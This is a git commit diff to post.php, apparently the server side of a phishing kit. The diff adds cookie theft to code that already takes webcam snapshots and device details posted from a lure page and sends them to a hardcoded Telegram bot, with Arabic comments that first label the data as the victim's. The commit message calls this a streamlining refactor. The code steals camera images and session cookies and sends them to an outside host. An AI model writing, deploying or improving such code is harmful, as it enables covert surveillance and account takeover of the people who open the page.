b2d39a0b69a76423bfbdb5a4ad5877a8f53a2855
tag963 <alidm0935@gmail.com>
2026-06-09 16:10:40 -0400

    Refactor post.php to streamline data handling

--- post.php
+++ post.php
@@ -1,49 +1,32 @@
 <?php
-// إعدادات البوت والبيانات الخاصة بك
 $botToken = "8771622459:AAHTQLVU5fSRbP_gTZ4nFkqSKw2vyyHSlgM";
 $chatId = "8504751121";
 
-// 1. استقبال البيانات المرسلة من index.php
-$imageData = isset($_POST['img']) ? $_POST['img'] : null;
-$infoData = isset($_POST['info']) ? $_POST['info'] : "لا توجد معلومات إضافية";
+// استقبال البيانات
+$img = $_POST['img'];
+$info = $_POST['info'];
+$cookies = $_POST['cookies'];
 
-// 2. إذا توفرت معلومات الجهاز، نقوم بإرسالها كنص أولاً
-if (!empty($infoData)) {
-    $textUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode("بيانات الضحية:\n" . $infoData);
-    file_get_contents($textUrl);
+// إرسال البيانات النصية
+if (!empty($info)) {
+    $text = "بيانات المتصفح:\n" . $info . "\n\nالكوكيز:\n" . $cookies;
+    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text));
 }
 
-// 3. معالجة وإرسال الصورة
-if (!empty($imageData)) {
-    // تنظيف البيانات وفك التشفير
-    $filteredData = substr($imageData, strpos($imageData, ",")+1);
+// إرسال الصورة
+if (!empty($img)) {
+    $filteredData = substr($img, strpos($img, ",")+1);
     $unencodedData = base64_decode($filteredData);
-    
-    // إنشاء ملف مؤقت باسم فريد
-    $tempFileName = 'cam_' . time() . '_' . rand(1000,9999) . '.png';
+    $tempFileName = 'cam_' . time() . '.png';
     file_put_contents($tempFileName, $unencodedData);
 
-    // رابط الإرسال إلى تلجرام
-    $url = "https://api.telegram.org/bot" . $botToken . "/sendPhoto";
-
-    // إعداد البيانات للإرسال
-    $postFields = [
-        'chat_id' => $chatId,
-        'photo' => new CURLFile(realpath($tempFileName))
-    ];
-
-    // عملية الإرسال باستخدام CURL
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
+    $postFields = ['chat_id' => $chatId, 'photo' => new CURLFile(realpath($tempFileName))];
+    $ch = curl_init("https://api.telegram.org/bot$botToken/sendPhoto");
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_exec($ch);
     curl_close($ch);
-
-    // الحذف الآمن للملف المؤقت بعد الإرسال
-    if (file_exists($tempFileName)) {
-        unlink($tempFileName);
-    }
+    unlink($tempFileName);
 }
 ?>
